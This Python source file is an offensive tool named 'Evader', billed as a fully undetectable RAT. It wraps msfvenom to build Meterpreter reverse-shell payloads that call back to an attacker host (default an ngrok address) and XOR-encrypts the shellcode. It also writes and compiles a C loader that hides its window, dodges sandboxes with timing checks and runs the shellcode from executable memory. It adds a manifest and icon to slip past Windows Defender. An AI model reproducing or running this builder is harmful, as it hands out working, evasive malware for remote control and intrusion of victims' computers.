#!/usr/bin/env python3

#            ---------------------------------------------------
#                         Evader by PersianHydra
#            ---------------------------------------------------

# @name   : Evader => FUD RAT
# @url    : https://github.com/dev-mukherjees/
# @author : Dev Mukherjee (hacktidu.in)

#  --------------------------------------------------------------------------------------

import os
import random
import string
import hashlib


colour_codes = {
    "GREEN": "\033[1;32m",
    "YELLOW": "\033[1;33m",
    "MAGENTA": "\033[1;35m",
    "CYAN": "\033[1;36m",
    "BLUE": "\033[1;34m",
    "RESET_ALL": "\033[0m",
    "RED": "\033[1;31m",
}


def _print_base(message, prefix,
                colour): return f"{colour}[{prefix}]{colour_codes['RESET_ALL']} {message}"


def print_status(message):
    """Indicate normal program output"""
    return _print_base(message, "+", colour_codes["CYAN"])


def print_query(message):
    """Indicate user input expected"""
    return _print_base(message, "?", colour_codes["YELLOW"])


def print_success(message):
    """Indicate success"""
    return _print_base(message, "✔", colour_codes["GREEN"])


def print_error(message):
    """Indicate failure"""
    return _print_base(message, "!", colour_codes["MAGENTA"])


def random_string(length=10):
    # Return 11 character string where the first character is always a letter
    return f"{random.choice(string.ascii_lowercase)}{''.join(random.choices(string.ascii_lowercase + string.digits, k=length))}"


def xor(data_as_bytes, key):
    key_length = len(key)
    key_int = list(map(ord, key))
    return bytes(((data_as_bytes[i] ^ key_int[i % key_length]) for i in range(len(data_as_bytes))))


def writetofile(data, key, output_file):
    shellcode = "\\x"
    shellcode += "\\x".join(format(b, "02x") for b in data)

    names = [random_string() for _ in range(10)]

    if shellcode:
        try:
            with open(output_file, "w+") as f:
                shellcode_lines = []
                shellcode_lines.append(
                    "#include <windows.h>\n#include <stdio.h>\n\n")
                shellcode_lines.append(
                    f"BOOL {names[8]}() {{\nint Tick = GetTickCount();\nSleep(1000);\nint Tac = GetTickCount();\nif ((Tac - Tick) < 1000) {{\nreturn 0;}}\nelse return 1;\n}}\n\n")
                shellcode_lines.append(
                    f" int main () {{ \n HWND hWnd = GetConsoleWindow();\nShowWindow(hWnd, SW_HIDE);\nHINSTANCE DLL = LoadLibrary(TEXT(\"{names[2]}.dll\"));\nif (DLL != NULL) {{\nreturn 0;}}\n")
                shellcode_lines.append(
                    f"if ({names[8]}()) {{char * {names[4]} = NULL;\n{names[4]} = (char *)malloc(100000000);\nif ({names[4]} != NULL) {{\nmemset({names[4]}, 00, 100000000);\nfree({names[4]});\n")
                shellcode_lines.append(
                    f"\nchar {names[3]}[] = \"{shellcode}\";")
                shellcode_lines.append(f"\n\nchar {names[7]}[] = \"{key}\";")
                shellcode_lines.append(
                    f"char {names[5]}[sizeof {names[3]}];\nint j = 0;\nfor (int i = 0; i < sizeof {names[3]}; i++) {{\nif (j == sizeof {names[7]} - 1) j = 0;\n{names[5]}[i] = {names[3]}[i] ^ {names[7]}[j];\nj++;\n}}\n")
                shellcode_lines.append(
                    f"void *{names[6]} = VirtualAlloc(0, sizeof {names[5]}, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\nmemcpy({names[6]}, {names[5]}, sizeof {names[5]});CreateThread(NULL, 0,{names[6]}, NULL, 0, NULL);\n\nwhile (1) {{\nif (!{names[8]}()) {{ return 0; }}\n}}\n}}\n}}\n}}\n")
                f.writelines(shellcode_lines)
            print(print_success(
                f"Encrypted Shellcode saved in [{output_file}]"))
        except IOError as e:
            print(print_error(
                f"[!] Could not write C++ code to [{output_file}]"))
            raise SystemExit(e)


if __name__ == "__main__":
    os.system("clear")

    print(f'''{colour_codes["RED"]}
                                                                          dddddddd
EEEEEEEEEEEEEEEEEEEEEE                                                    d::::::d
E::::::::::::::::::::E                                                    d::::::d
E::::::::::::::::::::E                                                    d::::::d
EE::::::EEEEEEEEE::::E                                                    d:::::d
  E:::::E       EEEEEEvvvvvvv           vvvvvvvaaaaaaaaaaaaa      ddddddddd:::::d     eeeeeeeeeeee    rrrrr   rrrrrrrrr
  E:::::E              v:::::v         v:::::v a::::::::::::a   dd::::::::::::::d   ee::::::::::::ee  r::::rrr:::::::::r
  E::::::EEEEEEEEEE     v:::::v       v:::::v  aaaaaaaaa:::::a d::::::::::::::::d  e::::::eeeee:::::eer:::::::::::::::::r
  E:::::::::::::::E      v:::::v     v:::::v            a::::ad:::::::ddddd:::::d e::::::e     e:::::err::::::rrrrr::::::r
  E:::::::::::::::E       v:::::v   v:::::v      aaaaaaa:::::ad::::::d    d:::::d e:::::::eeeee::::::e r:::::r     r:::::r
  E::::::EEEEEEEEEE        v:::::v v:::::v     aa::::::::::::ad:::::d     d:::::d e:::::::::::::::::e  r:::::r     rrrrrrr
  E:::::E                   v:::::v:::::v     a::::aaaa::::::ad:::::d     d:::::d e::::::eeeeeeeeeee   r:::::r
  E:::::E       EEEEEE       v:::::::::v     a::::a    a:::::ad:::::d     d:::::d e:::::::e            r:::::r
EE::::::EEEEEEEE:::::E        v:::::::v      a::::a    a:::::ad::::::ddddd::::::dde::::::::e           r:::::r
E::::::::::::::::::::E         v:::::v       a:::::aaaa::::::a d:::::::::::::::::d e::::::::eeeeeeee   r:::::r
E::::::::::::::::::::E          v:::v         a::::::::::aa:::a d:::::::::ddd::::d  ee:::::::::::::e   r:::::r
EEEEEEEEEEEEEEEEEEEEEE           vvv           aaaaaaaaaa  aaaa  ddddddddd   ddddd    eeeeeeeeeeeeee   rrrrrrr


                                                                                 By Dev Mukherjee (hacktidu.in)

{colour_codes['RESET_ALL']}''')

    payload_type = input(print_query(
        "What payload do you need [tcp--https--http--ipv6_tcp]: "))
    # If payload_type==None, default to "tcp"
    payload_type = payload_type or "tcp"
    print(print_success(f"Payload TYPE : {payload_type}"))

    arch = input(print_query(
        "Enter arch for Payload [x86--x64] [default : x64]: "))
    arch = arch or "x64"
    print(print_success(f"arch for Payload: {arch}"))

    lhost = input(print_query("Enter LHOST for Payload [NGROK support]: "))
    # If lhost==None, default to "0.tcp.ngrok.io"
    lhost = lhost or "0.tcp.ngrok.io"
    print(print_success(f"LHOST for Payload [LPORT] : {lhost}"))

    lport = None
    while not lport:
        lport = input(print_query("Enter LPORT for Payload [NGROK support]: "))
    print(print_success(f"LPORT for Payload : {lport}"))

    iterations = input(print_query(
        "Enter Number of iterations for Payload [default : 2]: "))
    iterations = iterations or "2"
    print(print_success(f"Iterations for Payload: {iterations}"))

    encryption = input(print_query(
        "Enter Type of Encryption for Payload [default : x86/shikata_ga_nai]: "))
    encryption = encryption or "x86/shikata_ga_nai"
    print(print_success(f"Encryption for Payload: {encryption}"))

    icon_name = input(print_query(
        "Enter path of icon [default : evader.ico]: "))
    icon_name = encryption or "evader.ico"
    print(print_success(f"Icon for Payload: {icon_name}"))

    file_path = input(print_query(
        "Enter path of icon [default : ./result]: "))
    file_path = encryption or "./result"
    print(print_success(f"Payload will be saved in {file_path}"))

if arch == "x64":
    raw_payload = (
        f"msfvenom -p windows/x64/meterpreter_reverse_{payload_type} LHOST={lhost} LPORT={lport} -i {iterations} -e {encryption} EXITFUNC=process --platform windows -a x64 -f raw -o ./result/Evader.raw")

if arch == "x86":
    raw_payload = (
        f"msfvenom -p windows/meterpreter_reverse_{payload_type} LHOST={lhost} LPORT={lport} -i {iterations} -e {encryption} EXITFUNC=process --platform windows -a x86 -f raw -o ./result/Evader.raw")

print(print_status("Checking directories..."))

print(print_status(
    "Creating [./result] directory for resulting code files"))
os.makedirs("./result", exist_ok=True)
os.system(raw_payload)

try:
    shellcode_output = "./result/Evader.raw"
    with open(shellcode_output, encoding="utf-8", errors="ignore") as shellcode_output_handle:
        shellcode_bytes = bytearray(shellcode_output_handle.read(), "utf8")
        print(print_status(
            f"Shellcode file [{shellcode_output}] successfully loaded"))
except IOError as e:
    print(print_error(f"Could not open or read file [{shellcode_output}]"))
    raise SystemExit(e)

print(print_status(
    f"MD5 hash of the initial shellcode: [{hashlib.md5(shellcode_bytes).hexdigest()}]"))
print(print_status(f"Shellcode size: [{len(shellcode_bytes)}] bytes"))

master_key = input(print_query(
    "Enter the Key to Encrypt Shellcode with: "))
print(print_success(
    f"XOR Encrypting the shellcode with key [{master_key}]"))
transformed_shellcode = xor(shellcode_bytes, master_key)

print(print_status(
    f"Encrypted shellcode size: [{len(transformed_shellcode)}] bytes"))

# Writing To File
print(print_status("Generating C code file"))
source_file = f"./result/Evader_{lport}.c"
writetofile(transformed_shellcode, master_key, source_file)

# Compiling
exe_name = f"./result/Evader_{lport}"
print(print_success(
    f"Compiling file [{source_file}] with Mingw Compiler "))

if arch == "x64":
    compilation_string = f"x86_64-w64-mingw32-gcc {source_file} -o {exe_name}.exe"

if arch == "x86":
    compilation_string = f"i686-w64-mingw32-gcc {source_file} -o {exe_name}.exe"

os.system(compilation_string)

print(print_success("Compiled Sucessfully"))
print(print_success("Removing Temp Files"))
os.remove("./result/Evader.raw")
os.remove(source_file)

manifest = f"wine rcedit.exe --application-manifest template.exe.manifest {exe_name}.exe;#1 "

while generate_manifest := input(print_query("Do you want to add Manifest (Generally Bypasses Windows Defender)? (y/n) ")).lower().strip():
    if generate_manifest not in ("y", "n") or not generate_manifest:
        print(print_error("Answer must be 'y' or 'n'"))
        continue
    else:
        break

    # Display Results
print(f"\n{'='*36} RESULT {'='*36}\n")

if generate_manifest == "y":
    print(print_status("Adding Manifest"))
    os.system(manifest)
    print(print_success(f"Evader File with Manifest [{exe_name}.exe]"))
else:
    print(print_success(f"Evader File [{exe_name}.exe]"))


icon = f"wine rcedit.exe --set-icon {icon_name} {exe_name}.exe;#1 "

while generate_icon := input(print_query("Do you want to add Icon ? (y/n) ")).lower().strip():
    if generate_icon not in ("y", "n") or not generate_icon:
        print(print_error("Answer must be 'y' or 'n'"))
        continue
    else:
        break

    # Display Results icon
print(f"\n{'='*36} RESULT {'='*36}\n")

if generate_icon == "y":
    print(print_status("Adding icon"))
    os.system(icon)
    print(print_success(f"Evader File with icon [{exe_name}.exe]"))
else:
    print(print_success(f"Evader File [{exe_name}.exe]"))
print("\n")

print(print_status("Dev Mukherjee\n"))
print(print_success("Happy Evasion\n"))
